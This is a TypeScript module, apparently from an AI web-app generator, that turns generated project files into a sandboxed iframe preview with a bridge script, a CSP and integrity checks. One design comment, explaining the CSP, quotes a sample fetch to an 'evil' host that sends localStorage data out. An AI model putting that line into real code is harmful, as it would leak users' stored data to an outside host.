/**
 * 预览组装器：把"多文件"编译成"一份能直接丢进 iframe 的 HTML"。
 *
 * 为什么在内联而不是 blob + 相对路径：
 *  - 生成物可能引用 styles.css / app.js，srcdoc 里没有同源静态目录可解析；
 *  - 内联后整份文档是自包含的，导出 ZIP 与分享页可以复用同一份产物。
 *
 * 时间顺序很重要：桥接脚本必须插在 <head> 之后、业务脚本之前，
 * 否则生成的应用在解析阶段抛的错会漏捕获。
 *
 * 放在 shared/ 而不是 server/：前端也要用它 —— 生成过程中每写完一个文件就
 * 本地组装一次，让预览"边生成边长出来"。服务端与浏览器共用同一个组装器，
 * 才不会出现"预览里能跑、落库后跑不起来"这类两套逻辑漂移出来的问题。
 */

import type { Check, DesignTweak, FileEntry } from '../types'
import { MAX_TOTAL_BYTES } from '../types'
import { emptyAssetSink, inlineAssets, type AssetSink } from './assets'
import { applyBundle, bundleModules, findModuleEntry, isModuleProject, type BundleRuntime, type Compiler } from './bundle'
import { byteLength } from './bytes'
import { expandIcons, type ExpandedIcons } from './icons'
import { buildShell, CARRY_KEY, collectPages, localPageLinks, pageRoute, type PageUnit, type ShellPage } from './pages'
import { injectTweak, usesDesignTokens } from './tweak'

export interface AssembleResult {
  html: string
  entry: string | null
  checks: Check[]
  inlined: string[]
  missing: string[]
  /** 语法就不通的脚本文件：驱动修复轮（见 index.ts），也是"看起来生成了、其实一打开就报错"的唯一拦截点 */
  broken: string[]
}

/**
 * 组装依赖的两个外部能力，都由调用方注入。
 *
 * 转译器（sucrase）在浏览器里是懒加载的（见 src/lib/react-preview.ts），在 Node 里是
 * 直接 import 的；React 运行时同理（浏览器 `?raw`、Node 读 node_modules）。
 * 把它做成参数而不是模块级单例，是为了让 `assemble` 保持纯函数 —— 现有的一堆单测
 * 调 `assemble(files)` 时不传任何东西，走的仍然是原来的原生路径。
 */
export interface AssembleOptions {
  compile?: Compiler
  runtime?: BundleRuntime
}

/**
 * 语法体检：编译但不执行。
 *
 * 为什么必须查：模型（尤其小模型 + 输出预算紧时）会把一个字符串写到一半就停，
 * 结构检查全绿、预览却是一片空白 —— 这类"静默坏掉"比任何报错都伤信任。
 * `new Function` 只编译不运行，所以既能抓到语法错误，又不会执行生成物的代码。
 */
export function scriptSyntax(code: string): string | null {
  try {
    new Function(code)
    return null
  } catch (error) {
    return error instanceof Error ? error.message : String(error)
  }
}

const LOCAL_URL = /^(?!https?:|data:|mailto:|tel:|#|\/\/)/i

/**
 * 本地引用 → 项目内路径。
 *
 * 必须按引用方所在目录解析：`pages/about.html` 里的 `../styles.css` 指的是根目录
 * 的 styles.css，直接剥掉 `./` 会得到 `../styles.css` 这个不存在的路径，于是
 * 第二个页面开始就"样式全丢"——这是多页面最容易踩、又最难从界面上看出原因的一处。
 */
function normalize(url: string, from = ''): string {
  const clean = url.trim().replace(/[?#].*$/, '')
  if (!clean.startsWith('.')) return clean.replace(/^\/+/, '')
  const parts = from.split('/').slice(0, -1)
  for (const part of clean.split('/')) {
    if (part === '..') parts.pop()
    else if (part !== '.' && part !== '') parts.push(part)
  }
  return parts.join('/')
}

function escapeJson(value: unknown): string {
  return JSON.stringify(value).replace(/<\//g, '<\\/').replace(/\u2028/g, '\\u2028').replace(/\u2029/g, '\\u2029')
}

/** 错误桥：运行时错误回传 + 不透明源下的 storage 代理。 */
export function bridgeScript(): string {
  return `<script data-nucleus="bridge">
(function () {
  var post = function (payload) {
    try { parent.postMessage(Object.assign({ __nucleus: 1 }, payload), '*'); } catch (e) {}
  };
  var str = function (value) {
    if (typeof value === 'string') return value;
    try { return JSON.stringify(value); } catch (e) { return String(value); }
  };
  addEventListener('error', function (e) {
    var target = e.target;
    if (target && target !== window && target.tagName) {
      post({ kind: 'error', message: '资源加载失败: ' + target.tagName.toLowerCase() + (target.src || target.href || '') });
      return;
    }
    post({ kind: 'error', message: (e.message || 'Script error') + ' @' + (e.filename || 'inline') + ':' + (e.lineno || 0) });
  }, true);
  addEventListener('unhandledrejection', function (e) {
    post({ kind: 'error', message: 'Unhandled rejection: ' + str(e.reason && e.reason.message ? e.reason.message : e.reason) });
  });
  var rawError = console.error;
  console.error = function () {
    var parts = [];
    for (var i = 0; i < arguments.length; i++) parts.push(str(arguments[i]));
    post({ kind: 'error', message: parts.join(' ') });
    rawError.apply(console, arguments);
  };
  post({ kind: 'ready' });

  /*
   * 心跳应答。宿主每秒 ping 一次，连续几秒收不到 pong 就认定"应用卡住了"。
   *
   * 这段代码本身也可能排不上队：while(true){} 会把整个渲染进程的主线程占死，
   * 壳和页面一起哑掉 —— 这恰恰是我们要判定的现象，所以不需要更聪明的办法。
   */
  addEventListener('message', function (e) {
    var id = e.data && e.data.__nucleus_ping;
    if (id === undefined) return;
    post({ kind: 'pong', id: id });
  });

  /*
   * 弹窗：沙箱里已经没有 allow-popups，原生 window.open 会返回 null 且什么都不发生。
   * 交给宿主开标签页 —— 用户看到的是"链接真的打开了"，而不是"点了没反应"。
   * 顺带把 target=_blank / 外链的点击也收上来，理由同上。
   */
  window.open = function (url) {
    if (url) post({ kind: 'open', url: String(url) });
    return null;
  };
  addEventListener('click', function (e) {
    var node = e.target;
    var link = node && node.closest ? node.closest('a[href]') : null;
    if (!link) return;
    var href = link.getAttribute('href') || '';
    if (!href || href.charAt(0) === '#') return;
    var blank = (link.getAttribute('target') || '').toLowerCase() === '_blank';
    if (!blank && !/^https?:\\/\\//i.test(href)) return;
    e.preventDefault();
    post({ kind: 'open', url: link.href || href });
  }, true);

  /**
   * 多页面预览的页内导航：把 <a href="pages/about.html"> 翻译成路由切换。
   *
   * 用 URL 解析而不是手写字符串拼接：../index.html 该指到哪，交给浏览器算，
   * 才能和"导出成真实多文件后放到静态服务器"的行为完全一致。
   */
  if (window.__NUCLEUS_PAGE__) {
    addEventListener('click', function (e) {
      var node = e.target;
      var link = node && node.closest ? node.closest('a[href]') : null;
      if (!link) return;
      var href = link.getAttribute('href') || '';
      if (!href || href.charAt(0) === '#') return;
      var url;
      try { url = new URL(href, 'https://nucleus.local/' + String(window.__NUCLEUS_PAGE__).replace(/^\\/+/, '')); } catch (err) { return; }
      if (url.origin !== 'https://nucleus.local') return;
      var path = url.pathname;
      var tail5 = path.slice(-5).toLowerCase();
      var tail4 = path.slice(-4).toLowerCase();
      if (tail5 !== '.html' && tail4 !== '.htm') return;

      var route = path;
      while (route.charAt(0) === '/') route = route.slice(1);
      route = tail5 === '.html' ? route.slice(0, -5) : route.slice(0, -4);
      if (route.slice(-6).toLowerCase() === '/index') route = route.slice(0, -6);
      if (route.toLowerCase() === 'index') route = '';
      if (route.slice(0, 6).toLowerCase() === 'pages/') route = route.slice(6);
      while (route.charAt(route.length - 1) === '/') route = route.slice(0, -1);
      e.preventDefault();
      post({ kind: 'navigate', to: route ? '/' + route : '/' });
    }, true);
  }

  // 宿主的设计微调：直接写到 documentElement 的内联样式上。
  // 不重载 iframe ⇒ 应用内状态、输入框内容、滚动位置全部保留；这正是"改颜色不该重新生成"的体验前提。
  // 协议：{ __nucleus_tweak: { reset: boolean, vars: { '--accent': '#...', ... } } }
  addEventListener('message', function (e) {
    var t = e.data && e.data.__nucleus_tweak;
    if (!t) return;
    var root = document.documentElement;
    if (!root) return;
    if (t.reset) {
      root.style.removeProperty('--accent');
      root.style.removeProperty('--accent-soft');
      root.style.removeProperty('--accent-ink');
      root.style.removeProperty('--radius');
    }
    var vars = t.vars || {};
    for (var key in vars) {
      if (!Object.prototype.hasOwnProperty.call(vars, key)) continue;
      if (key.indexOf('--') !== 0) continue;
      root.style.setProperty(key, String(vars[key]));
    }
  });

  var seed = (window.__NUCLEUS_SEED && typeof window.__NUCLEUS_SEED === 'object') ? window.__NUCLEUS_SEED : {};
  var mem = {};
  for (var k in seed) { if (Object.prototype.hasOwnProperty.call(seed, k)) mem[k] = String(seed[k]); }
  /*
   * 多页面预览：建帧时带来的存储快照。必须在这里合并（而不是等 message），
   * 因为页面自己的脚本马上就会跑，等异步消息就晚了。
   */
  var carry = (window.${CARRY_KEY} && typeof window.${CARRY_KEY} === 'object') ? window.${CARRY_KEY} : null;
  if (carry) { for (var ck in carry) { if (Object.prototype.hasOwnProperty.call(carry, ck)) mem[ck] = String(carry[ck]); } }
  // 已经在跑的帧之间同步：别的页面写入时由壳广播过来
  addEventListener('message', function (e) {
    var s = e.data && e.data.__nucleus_store;
    if (!s) return;
    if (s.op === 'set') mem[String(s.key)] = String(s.value);
    else if (s.op === 'remove') delete mem[String(s.key)];
    else if (s.op === 'clear') mem = {};
  });
  var probe = '__nucleus_probe__';
  var nativeOk = false;
  /*
   * 多页面预览强制走内存 shim。
   *
   * 沙箱文档是不透明源，各帧的 localStorage 即便"能用"也互不可见 —— 探针成功只说明
   * 这个文档自己能写，不代表另一页读得到。统一走 shim，再由壳广播 + 建帧时携带快照，
   * 跨页行为才是确定的（写入同时上报宿主，刷新后还能从种子恢复）。
   */
  if (!window.__NUCLEUS_PAGE__) {
    try { window.localStorage.setItem(probe, '1'); window.localStorage.removeItem(probe); nativeOk = true; } catch (e) { nativeOk = false; }
  }
  if (!nativeOk) {
    var shim = {
      getItem: function (key) { key = String(key); return Object.prototype.hasOwnProperty.call(mem, key) ? mem[key] : null; },
      setItem: function (key, value) { key = String(key); mem[key] = String(value); post({ kind: 'storage', op: 'set', key: key, value: String(value) }); },
      removeItem: function (key) { key = String(key); delete mem[key]; post({ kind: 'storage', op: 'remove', key: key }); },
      clear: function () { mem = {}; post({ kind: 'storage', op: 'clear' }); },
      key: function (index) { var keys = Object.keys(mem); return index < keys.length ? keys[index] : null; }
    };
    try {
      Object.defineProperty(shim, 'length', { get: function () { return Object.keys(mem).length; } });
      Object.defineProperty(window, 'localStorage', { configurable: true, get: function () { return shim; } });
      Object.defineProperty(window, 'sessionStorage', { configurable: true, get: function () { return shim; } });
    } catch (e) {}
  }
})();
</script>`
}

/**
 * UTF-8 字节数（实现在 bytes.ts，这里转出去，历史调用点不用改）。
 *
 * 前端也要组装预览（边生成边看，见 Studio 的 liveHtml），所以那里不能直接用
 * `Buffer` —— 浏览器里没有它，一引用就抛。
 */
export { byteLength }

function pickEntry(files: Map<string, FileEntry>): FileEntry | null {
  const exact = files.get('index.html')
  if (exact) return exact
  const html = [...files.values()].filter((f) => /\.html?$/i.test(f.path))
  if (html.length === 0) return null
  const preferred = html.find((f) => /^(index|main|app)\.html?$/i.test(f.path))
  return preferred ?? html[0]!
}

/** 导出时也要用同一套入口判定，避免"预览用 index.html、导出改了另一个文件"。 */
export function entryPath(files: FileEntry[]): string | null {
  const map = new Map<string, FileEntry>()
  for (const file of files) map.set(file.path, file)
  return pickEntry(map)?.path ?? null
}

function inlineStylesheets(
  html: string,
  files: Map<string, FileEntry>,
  inlined: string[],
  missing: string[],
  from: string,
) {
  return html.replace(/<link\b[^>]*>/gi, (tag) => {
    if (!/rel\s*=\s*["']?stylesheet/i.test(tag)) return tag
    const href = /href\s*=\s*("([^"]*)"|'([^']*)')/i.exec(tag)
    const raw = href?.[2] ?? href?.[3] ?? ''
    if (!raw || !LOCAL_URL.test(raw.trim())) return tag
    const path = normalize(raw, from)
    const file = files.get(path)
    if (!file) {
      missing.push(path)
      return tag
    }
    inlined.push(path)
    const css = file.content.replace(/<\/style/gi, '<\\/style')
    return `<style data-src="${path}">\n${css}\n</style>`
  })
}

function inlineScripts(
  html: string,
  files: Map<string, FileEntry>,
  inlined: string[],
  missing: string[],
  from: string,
) {
  return html.replace(/<script\b([^>]*)>\s*<\/script>/gi, (tag, attrs: string) => {
    const src = /src\s*=\s*("([^"]*)"|'([^']*)')/i.exec(attrs)
    const raw = src?.[2] ?? src?.[3] ?? ''
    if (!raw || !LOCAL_URL.test(raw.trim())) return tag
    const path = normalize(raw, from)
    const file = files.get(path)
    if (!file) {
      missing.push(path)
      return tag
    }
    inlined.push(path)
    const js = file.content.replace(/<\/script/gi, '<\\/script')
    const type = /type\s*=\s*("([^"]*)"|'([^']*)')/i.exec(attrs)?.[2] ?? ''
    const typeAttr = type && type !== 'text/javascript' ? ` type="${type}"` : ''
    return `<script data-src="${path}"${typeAttr}>\n${js}\n</script>`
  })
}

function injectBridge(html: string): string {
  return injectAfterHead(html, bridgeScript())
}

/**
 * 预览用的内容安全策略。
 *
 * 沙箱（无 allow-same-origin）挡的是"碰到宿主"，挡不住"把手上的数据发出去"：
 * 一个 `fetch('https://evil/?d=' + localStorage.getItem(...))` 在沙箱里照样能跑。
 * `connect-src 'none'` 就是补这个口子 —— 生成物没有联网的理由，它本来也没有后端。
 *
 * 其它几条都是"别把能用的功能也一起关掉"：
 *  - script/style 放开 `https:` 与 inline：CDN 脚本、内联样式是提示词允许的写法；
 *  - img/font/media 放开 `data:` 与 `https:`：图床、字体、视频占位很常见；
 *  - frame-src 放开 `https:`：地图/视频嵌入不至于整块消失（跨源 iframe 碰不到宿主）。
 */
export const CONTENT_SECURITY_POLICY = [
  "default-src 'none'",
  "script-src 'unsafe-inline' 'unsafe-eval' https: blob:",
  "style-src 'unsafe-inline' https:",
  "img-src data: blob: https:",
  "font-src data: https:",
  "media-src data: blob: https:",
  "frame-src https:",
  "connect-src 'none'",
  "form-action 'none'",
  "base-uri 'none'",
].join('; ')

/**
 * 注入 CSP。必须尽可能靠前（meta 只对出现在它之后的内容生效），
 * 所以放在组装链的最后一步 —— injectAfterHead 是"后插的在前"。
 *
 * 生成物自己带了 CSP 就不覆盖：那是它的作者明确表达的意图。
 */
function injectCsp(html: string): string {
  if (/http-equiv\s*=\s*["']?content-security-policy/i.test(html)) return html
  return injectAfterHead(html, `<meta http-equiv="Content-Security-Policy" content="${CONTENT_SECURITY_POLICY}">`)
}

/** 多页面预览：把"当前页在项目里的路径"告诉页面脚本，链接才能按相对路径解析。 */
function injectPageMark(html: string, path: string): string {
  return injectAfterHead(html, `<script data-nucleus="page">window.__NUCLEUS_PAGE__=${escapeJson(path)};</script>`)
}

/** 插到 <head> 之后；没有 head 就造一个，再没有就贴在最前面。 */
function injectAfterHead(html: string, snippet: string): string {
  const head = /<head\b[^>]*>/i.exec(html)
  if (head) {
    const at = head.index + head[0].length
    return html.slice(0, at) + '\n' + snippet + html.slice(at)
  }
  const htmlTag = /<html\b[^>]*>/i.exec(html)
  if (htmlTag) {
    const at = htmlTag.index + htmlTag[0].length
    return html.slice(0, at) + `\n<head>${snippet}</head>` + html.slice(at)
  }
  return snippet + '\n' + html
}

interface DocSink {
  inlined: string[]
  missing: string[]
  /** 图标与资产的账，最后汇总成 `icons` / `assets` 两个自检项 */
  icons: ExpandedIcons
  assets: AssetSink
}

/** 把一份页面文档组装成自包含 HTML：内联样式/脚本 → 资产 → 图标 → 页标记 → 桥接 → 设计微调。 */
function buildDocument(
  entry: { path: string; content: string },
  files: Map<string, FileEntry>,
  tweak: DesignTweak | undefined,
  sink: DocSink,
  options: { markPage?: boolean } = {},
): string {
  let html = inlineStylesheets(entry.content, files, sink.inlined, sink.missing, entry.path)
  html = inlineScripts(html, files, sink.inlined, sink.missing, entry.path)
  // 资产要在脚本内联之后：CSS 里的 url(...) 这时才在文档里，能一并换掉
  html = inlineAssets(html, files, entry.path, sink.assets)
  // 资产与样式/脚本共用同一份"已内联 / 缺失"账：修复轮只认 missing，
  // 少一条它就永远不知道该补哪个文件。
  sink.inlined.push(...sink.assets.inlined)
  sink.missing.push(...sink.assets.missing)
  // 图标放在桥接之前：展开后就是普通 svg，桥接不必知道它存在
  const icons = expandIcons(html)
  html = icons.html
  sink.icons.used.push(...icons.used)
  sink.icons.unknown.push(...icons.unknown)
  sink.icons.drawn += icons.drawn
  // 顺序有讲究：injectAfterHead 每次插在 <head> 之后，即"后插的在前"。
  // 先插桥接、再插页标记，页标记才会排在桥接之前 —— 桥接的链接翻译要读它。
  html = injectBridge(html)
  if (options.markPage) html = injectPageMark(html, entry.path)
  // 微调必须最后注入：它靠"后写者胜"覆盖应用自带的 :root 变量
  html = injectTweak(html, tweak)
  // CSP 再往后一步：injectAfterHead 是"后插的在前"，它要抢在所有资源之前
  html = injectCsp(html)
  return html
}

/**
 * 图标与资产的自检项。
 *
 * 都做成不阻断（info / warn）：
 *  - 未知图标名只是"少一个图标"，为它重生成整站不值；
 *  - 资产没内联成功时页面照样能跑，只是图不见了 —— 用户需要知道原因，而不是被拦下。
 */
function pushAssetChecks(checks: Check[], sink: DocSink) {
  const used = [...new Set(sink.icons.used)]
  const unknown = [...new Set(sink.icons.unknown)]
  const ok = unknown.length === 0
  checks.push({
    id: 'icons',
    label: '图标解析',
    ok,
    level: 'info',
    detail: ok
      ? `${used.length} 个内置图标${sink.icons.drawn ? `，另有 ${sink.icons.drawn} 个自绘` : ''}`
      : `${used.length} 个已解析，未识别：${unknown.slice(0, 5).join('、')}`,
  })

  const skipped = sink.assets.skipped
  checks.push({
    id: 'assets',
    label: '图片资产内联',
    ok: skipped.length === 0,
    level: 'warn',
    detail:
      sink.assets.inlined.length === 0 && skipped.length === 0
        ? '没有本地图片资产'
        : `${sink.assets.inlined.length} 个已内联（约 ${(sink.assets.bytes / 1024).toFixed(1)} KB）` +
          (skipped.length ? `；未处理：${skipped.slice(0, 3).map((item) => `${item.path}（${item.reason}）`).join('、')}` : ''),
  })
}

function newSink(): DocSink {
  return {
    inlined: [],
    missing: [],
    icons: { html: '', used: [], unknown: [], drawn: 0 },
    assets: emptyAssetSink(),
  }
}

/** 语法体检：所有 .js 都过一遍（多页面时也一样，一个坏脚本就能让整站白屏）。 */
function pushSyntaxChecks(files: Map<string, FileEntry>, checks: Check[], broken: string[]) {
  for (const file of files.values()) {
    if (!/\.js$/i.test(file.path)) continue
    const problem = scriptSyntax(file.content)
    if (problem) {
      broken.push(file.path)
      checks.push({
        id: `syntax:${file.path}`,
        label: `${file.path} 语法`,
        ok: false,
        level: 'block',
        detail: problem.slice(0, 160),
      })
    } else {
      checks.push({ id: `syntax:${file.path}`, label: `${file.path} 语法`, ok: true, level: 'block' })
    }
  }
}

/**
 * 模块工程（React / TSX）的打包分支。
 *
 * 返回 null 表示"这不是模块工程"，调用方继续走原来的内联路径 —— 老项目一个字节都不会变。
 * 失败时**不**退回内联：一份没被打包的 JSX 塞进文档只会白屏，不如把编译错误直接画在屏幕上，
 * 同时把失败文件列进 `broken`，让修复轮去补。
 */
function tryBundle(
  input: FileEntry[],
  entryFile: FileEntry,
  options: AssembleOptions,
): { content: string; checks: Check[]; broken: string[]; runtimeBytes: number } | null {
  if (!isModuleProject(input)) return null

  const entry = findModuleEntry(input, entryFile.content)
  if (!entry) {
    return {
      content: entryFile.content,
      checks: [
        {
          id: 'bundle',
          label: '模块入口',
          ok: false,
          level: 'block',
          detail: '是 JSX/TSX 工程，但入口 HTML 里没有 <script type="module" src="...">，也没找到 src/main',
        },
      ],
      broken: [],
      runtimeBytes: 0,
    }
  }

  if (!options.compile || !options.runtime) {
    return {
      content: entryFile.content,
      checks: [
        {
          id: 'bundle',
          label: '模块打包',
          ok: false,
          level: 'block',
          detail: '当前环境没有可用的打包器（浏览器端需要懒加载 sucrase 与 React 运行时）',
        },
      ],
      broken: [],
      runtimeBytes: 0,
    }
  }

  const result = bundleModules(input, entry, options.compile, options.runtime)
  if (!result.ok) {
    const detail = result.issues
      .slice(0, 3)
      .map((issue) => `${issue.path}：${issue.message}`)
      .join('；')
    return {
      content: `<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"></head><body>${result.script}</body></html>`,
      checks: [{ id: 'bundle', label: '模块打包', ok: false, level: 'block', detail }],
      broken: [...new Set(result.issues.map((issue) => issue.path))],
      runtimeBytes: 0,
    }
  }

  return {
    content: applyBundle(entryFile.content, result),
    checks: [
      {
        id: 'bundle',
        label: '模块打包',
        ok: true,
        level: 'block',
        detail: `${result.modules.length} 个模块已打包（入口 ${entry.module}，React 运行时 ${(result.runtimeBytes / 1024).toFixed(0)} KB）`,
      },
    ],
    broken: [],
    runtimeBytes: result.runtimeBytes,
  }
}

export function assemble(input: FileEntry[], tweak?: DesignTweak, options: AssembleOptions = {}): AssembleResult {
  const files = new Map<string, FileEntry>()
  for (const file of input) files.set(file.path, file)

  const entryFile = pickEntry(files)
  const inlined: string[] = []
  const missing: string[] = []
  const broken: string[] = []
  const checks: Check[] = []

  const sink = newSink()

  if (!entryFile) {
    checks.push({
      id: 'entry',
      label: '入口文件存在',
      ok: false,
      level: 'block',
      detail: '没有任何 .html 文件，无法生成预览',
    })
    return { html: '', entry: null, checks, inlined, missing, broken }
  }

  const pages = collectPages(input)
  // 只有一个 HTML 时走原来的单页路径：既有项目的行为必须逐字节不变
  if (pages.length >= 2) return assembleMultiPage(pages, entryFile, files, tweak)

  checks.push({ id: 'entry', label: '入口文件存在', ok: true, level: 'block', detail: entryFile.path })

  /**
   * React/TSX 工程先打包成"一段普通脚本 + 一段样式"，再走同一个组装管线。
   * 打包产物里已经没有 `type="module"`，所以后面的内联、资产、图标、桥接一步都不用改。
   */
  const bundled = tryBundle(input, entryFile, options)
  if (bundled) {
    checks.push(...bundled.checks)
    broken.push(...bundled.broken)
  }

  let html = buildDocument(
    bundled ? { path: entryFile.path, content: bundled.content } : entryFile,
    files,
    tweak,
    sink,
  )

  checks.push({
    id: 'refs',
    label: '引用完整性',
    ok: sink.missing.length === 0,
    level: 'warn',
    detail: sink.missing.length ? '缺失：' + sink.missing.join('、') : `已内联 ${sink.inlined.length} 个资源`,
  })

  const hasStructure = /<html\b/i.test(html) && /<body\b/i.test(html)
  checks.push({
    id: 'structure',
    label: 'HTML 结构完整',
    ok: hasStructure,
    level: 'warn',
    detail: hasStructure ? '<html> / <body> 正常' : '缺少 <html> 或 <body>，浏览器会自行补全但不保证样式',
  })

  /**
   * 体积只算"我们自己的代码"：React 运行时是平台注入的固定开销（约 141 KB），
   * 把它算进预算的话，一个组件多写两行就会爆掉 400 KB，而用户对此无能为力。
   */
  const runtimeBytes = bundled?.runtimeBytes ?? 0
  const totalBytes = byteLength(html) - runtimeBytes
  checks.push({
    id: 'size',
    label: '体积在预算内',
    ok: totalBytes <= MAX_TOTAL_BYTES,
    level: 'warn',
    detail:
      `${(totalBytes / 1024).toFixed(1)} KB / ${(MAX_TOTAL_BYTES / 1024).toFixed(0)} KB` +
      (runtimeBytes ? `（另有平台注入的 React 运行时 ${(runtimeBytes / 1024).toFixed(0)} KB，不计入）` : ''),
  })

  const external: string[] = []
  for (const m of html.matchAll(/(?:src|href)\s*=\s*["'](https?:\/\/[^"']+)["']/gi)) {
    if (m[1]) external.push(m[1])
  }
  checks.push({
    id: 'external',
    label: '外部依赖检查',
    ok: true,
    level: 'info',
    detail: external.length ? `${external.length} 个外链资源（离线不可用）：${external.slice(0, 3).join('、')}` : '完全自包含，可离线运行',
  })

  const risky = /(?:parent\.document|top\.document|window\.top\.location|parent\.location)/i.test(html)
  checks.push({
    id: 'sandbox_safe',
    label: '沙箱越权检查',
    ok: !risky,
    level: 'warn',
    detail: risky ? '检测到对父窗口的访问，预览沙箱下会被拦截' : '未发现跨窗口访问',
  })

  // 设计微调依赖设计令牌；没有令牌的应用只能调圆角，界面需要如实提示
  const tokenized = usesDesignTokens(html)
  checks.push({
    id: 'theme_vars',
    label: '可用设计令牌',
    // 主色微调靠 --accent：只有 --radius 时提示"可能不生效"是诚实的，
    // 但真正决定成败的是脚本能不能跑起来，所以语法错误单独提到 block 级。
    ok: /--accent\s*:/.test(html),
    level: 'info',
    detail: /--accent\s*:/.test(html)
      ? '声明了 --accent，支持实时改主色'
      : tokenized
        ? '只有 --radius：圆角可实时微调，主色需要重新生成'
        : '未声明设计令牌，实时微调可能不生效',
  })

  pushAssetChecks(checks, sink)

  // 语法体检：一个写到一半的字符串会让整个应用静默白屏，结构检查是看不出来的。
  // 模块工程跳过这一步：JSX 交给 `new Function` 必然报语法错（它不认识 JSX），
  // 那类问题由打包器在转译阶段如实报出来（见 tryBundle）。
  if (!bundled) pushSyntaxChecks(files, checks, broken)

  return {
    html,
    entry: entryFile.path,
    checks,
    inlined: [...new Set(sink.inlined)],
    missing: [...new Set(sink.missing)],
    broken,
  }
}

/**
 * 多页面：每页组装成独立文档，再套一个路由壳（见 pages.ts 里的取舍说明）。
 *
 * 与单页的差别只有"产物形态"：检查项一一对应，missing 除了缺 css/js，
 * 还会收进"链接指向了不存在的页面" —— 这类问题在单页项目里不存在，
 * 但它和"页面引用了 app.js 却没输出"是同一类故障，交给同一个修复轮处理。
 */
function assembleMultiPage(
  pages: PageUnit[],
  entryFile: FileEntry,
  files: Map<string, FileEntry>,
  tweak: DesignTweak | undefined,
): AssembleResult {
  const broken: string[] = []
  const checks: Check[] = []
  const sink = newSink()

  checks.push({ id: 'entry', label: '入口文件存在', ok: true, level: 'block', detail: entryFile.path })

  const docs: ShellPage[] = []
  for (const page of pages) {
    const doc = buildDocument({ path: page.path, content: page.content }, files, tweak, sink, { markPage: true })
    docs.push({ route: page.route, title: page.title, doc })
    // 指向不存在页面的链接：点了就是 404，趁修复轮让它补出来
    for (const href of localPageLinks(page.content)) {
      // 先按本页目录解析（../index.html），再折算成路由
      const target = pageRoute(normalize(href, page.path))
      if (!pages.some((item) => item.route === target)) sink.missing.push(href)
    }
  }

  checks.push({
    id: 'pages',
    label: '多页面路由',
    ok: true,
    level: 'info',
    detail: `${pages.length} 个页面：${pages.map((page) => page.route).join('、')}`,
  })

  const html = buildShell(docs)

  checks.push({
    id: 'refs',
    label: '引用完整性',
    ok: sink.missing.length === 0,
    level: 'warn',
    detail: sink.missing.length
      ? '缺失：' + [...new Set(sink.missing)].join('、')
      : `已内联 ${new Set(sink.inlined).size} 个资源`,
  })

  const indexDoc = docs.find((doc) => doc.route === '/')?.doc ?? docs[0]?.doc ?? ''
  const hasStructure = /<html\b/i.test(indexDoc) && /<body\b/i.test(indexDoc)
  checks.push({
    id: 'structure',
    label: 'HTML 结构完整',
    ok: hasStructure,
    level: 'warn',
    detail: hasStructure ? '各页面 <html> / <body> 正常' : '入口页面缺少 <html> 或 <body>，浏览器会自行补全但不保证样式',
  })

  const totalBytes = byteLength(html)
  checks.push({
    id: 'size',
    label: '体积在预算内',
    ok: totalBytes <= MAX_TOTAL_BYTES,
    level: 'warn',
    detail: `${(totalBytes / 1024).toFixed(1)} KB / ${(MAX_TOTAL_BYTES / 1024).toFixed(0)} KB（${pages.length} 个页面共享预算）`,
  })

  const external: string[] = []
  for (const match of html.matchAll(/(?:src|href)\s*=\s*["'](https?:\/\/[^"']+)["']/gi)) {
    if (match[1]) external.push(match[1])
  }
  checks.push({
    id: 'external',
    label: '外部依赖检查',
    ok: true,
    level: 'info',
    detail: external.length
      ? `${external.length} 个外链资源（离线不可用）：${external.slice(0, 3).join('、')}`
      : '完全自包含，可离线运行',
  })

  const risky = /(?:parent\.document|top\.document|window\.top\.location|parent\.location)/i.test(html)
  checks.push({
    id: 'sandbox_safe',
    label: '沙箱越权检查',
    ok: !risky,
    level: 'warn',
    detail: risky ? '检测到对父窗口的访问，预览沙箱下会被拦截' : '未发现跨窗口访问',
  })

  checks.push({
    id: 'theme_vars',
    label: '可用设计令牌',
    ok: /--accent\s*:/.test(html),
    level: 'info',
    detail: /--accent\s*:/.test(html)
      ? '声明了 --accent，支持实时改主色'
      : usesDesignTokens(html)
        ? '只有 --radius：圆角可实时微调，主色需要重新生成'
        : '未声明设计令牌，实时微调可能不生效',
  })

  pushAssetChecks(checks, sink)

  pushSyntaxChecks(files, checks, broken)

  return {
    html,
    entry: entryFile.path,
    checks,
    inlined: [...new Set(sink.inlined)],
    missing: [...new Set(sink.missing)],
    broken,
  }
}

/** 供分享页 / 导出使用：往组装结果里塞入持久化种子。 */
export function withSeed(html: string, seed: Record<string, string> | null): string {
  if (!seed || Object.keys(seed).length === 0) return html
  const script = `<script data-nucleus="seed">window.__NUCLEUS_SEED=${escapeJson(seed)};</script>`
  const head = /<head\b[^>]*>/i.exec(html)
  if (head) {
    const at = head.index + head[0].length
    return html.slice(0, at) + script + html.slice(at)
  }
  return script + html
}
